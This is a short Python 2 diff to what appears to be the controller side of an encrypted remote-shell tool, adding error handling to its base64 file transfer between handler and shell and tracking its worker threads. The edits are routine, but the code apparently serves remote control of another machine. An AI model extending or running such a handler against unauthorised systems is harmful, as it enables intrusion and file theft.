@@ -86,12 +86,17 @@ class UserInputWorker(MessageWorker): # Worker which takes user input and sends 
 	
 	def file_shell_to_handler(self, filename):
 		try:
+			try: os.remove(filename)
+			except: pass
 			with open(filename, "wb") as w:
 				while True:
 					data = self.input_queue.get()
 					if data == "EOF": break
+					elif data == "EOF_BAD": raise Exception("Download failed")
 					w.write(base64.b64decode(data))
 		except Exception as e:
+			try: os.remove(filename)
+			except: pass
 			print e
 				
 	def file_handler_to_shell(self, filename):
@@ -102,6 +107,7 @@ class UserInputWorker(MessageWorker): # Worker which takes user input and sends 
 				self.send("EOF")
 		except Exception as e:
 			print e
+			self.send("EOF_BAD")
 			
 	def run(self):
 		try:
@@ -123,6 +129,7 @@ class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
 			comm_socket.sendall(EncodeAES(output_queue.get()))	
 			
 workers = []
+workers_threads = []
 transmit_worker = TransmitWorker(chr(0)) # Create workers
 user_input_worker = UserInputWorker(chr(1))
 workers.append(user_input_worker)
@@ -132,6 +139,7 @@ for worker in workers: # Start workers
 	t = threading.Thread(target=worker.run)
 	t.daemon = True
 	t.start()
+	workers_threads.append((worker, t))
 
 while True:
 	data = ""
